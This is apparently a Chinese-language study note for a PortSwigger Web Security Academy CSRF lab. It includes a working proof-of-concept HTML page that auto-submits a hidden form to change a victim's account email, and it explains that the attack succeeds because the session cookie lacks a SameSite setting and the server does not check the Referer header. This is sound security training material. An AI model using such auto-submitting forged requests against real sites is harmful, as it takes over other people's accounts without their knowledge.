https://portswigger.net/web-security/learning-paths/csrf/csrf-how-to-construct-a-csrf-attack/csrf/lab-no-defenses#

## 过程

该 Lab 存在 CSRF 漏洞，只需要受害者跑下面的网页，就能修改他的邮箱
```html
<html>
    <body>
        <form
            action="https://0abf00ca042650f880ff1276009b00be.web-security-academy.net/my-account/change-email"
            method="POST"
            name="form1"
            enctype="application/x-www-form-urlencoded"
        >
            <input type="hidden" name="email" value="hacked@fuck.com" />
            <input type="submit" value="Submit request" />
        </form>
        <script>
            history.pushState("", "", "/");
            document.form1.submit();
        </script>
    </body>
</html>

```

### Cookie
服务器的鉴权点是 Cookie 里的 session
![[Pasted image 20260508110233.png]]

但是服务器并没有对该 Cookie 设置正确的 SameSite，导致其他网站发请求也会自动带上 Cookie
![[Pasted image 20260508111244.png]]

### 跨域
网站服务器也不会检测 referer 头，所以其他网站发请求也不会被限制

> [!NOTE] 
> 
